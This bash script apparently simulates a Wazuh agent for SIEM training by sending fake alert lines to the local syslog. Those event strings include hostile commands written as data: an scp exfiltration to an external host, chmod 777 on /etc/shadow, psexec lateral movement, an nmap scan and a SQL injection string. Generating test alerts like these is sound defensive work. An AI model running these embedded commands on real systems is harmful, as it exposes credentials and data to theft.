#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${GREEN}🤖 Starting Wazuh Agent Simulation...${NC}"

# Function to send simulated events
send_event() {
    local event_type=$1
    local event_data=$2
    local timestamp=$(date '+%b %d %H:%M:%S')
    
    echo -e "${BLUE}📡 Sending ${event_type} event...${NC}"
    
    # Send to Wazuh Manager via syslog
    logger -p local0.info -t "simulate-agent" "$timestamp $event_data"
    
    # Also send directly via netcat if available
    if command -v nc &> /dev/null; then
        echo "$timestamp simulate-agent: $event_data" | nc -u localhost 514 2>/dev/null || true
    fi
}

# Simulation scenarios
echo -e "${YELLOW}📋 Running Training Scenarios...${NC}"

# Scenario 1: Malware Detection
echo -e "${YELLOW}🦠 Scenario 1: Malware Detection${NC}"
send_event "malware" "ALERT: Trojan.Generic.123456 detected in /tmp/suspicious_file.exe"
sleep 2

# Scenario 2: Brute Force Attack
echo -e "${YELLOW}🔓 Scenario 2: Brute Force Attack${NC}"
for i in {1..6}; do
    send_event "brute_force" "authentication failure for user admin from IP 192.168.1.100"
    sleep 1
done

# Scenario 3: File Integrity Monitoring
echo -e "${YELLOW}📂 Scenario 3: File Integrity Violation${NC}"
send_event "file_monitoring" "File /etc/passwd has been modified"
sleep 2

# Scenario 4: Lateral Movement
echo -e "${YELLOW}↔️ Scenario 4: Lateral Movement${NC}"
send_event "lateral_movement" "Command executed: psexec \\\\192.168.1.101 -u admin cmd"
sleep 2

# Scenario 5: Data Exfiltration
echo -e "${YELLOW}📤 Scenario 5: Data Exfiltration${NC}"
send_event "data_exfiltration" "Command executed: scp /etc/sensitive_data.txt user@external-server.com:/tmp/"
sleep 2

# Scenario 6: Privilege Escalation
echo -e "${YELLOW}⬆️ Scenario 6: Privilege Escalation${NC}"
send_event "privilege_escalation" "Command executed: sudo chmod 777 /etc/shadow"
sleep 2

# Scenario 7: Network Reconnaissance
echo -e "${YELLOW}🕵️ Scenario 7: Network Scanning${NC}"
send_event "network_scan" "Command executed: nmap -sS -O 192.168.1.0/24"
sleep 2

# Scenario 8: Web Application Attack
echo -e "${YELLOW}🌐 Scenario 8: Web Attack${NC}"
send_event "web_attack" "GET /login.php?user=admin' OR 1=1-- HTTP/1.1"
sleep 2

echo -e "${GREEN}✅ Agent simulation completed!${NC}"
echo -e "${BLUE}💡 Check Wazuh Dashboard for generated alerts${NC}"
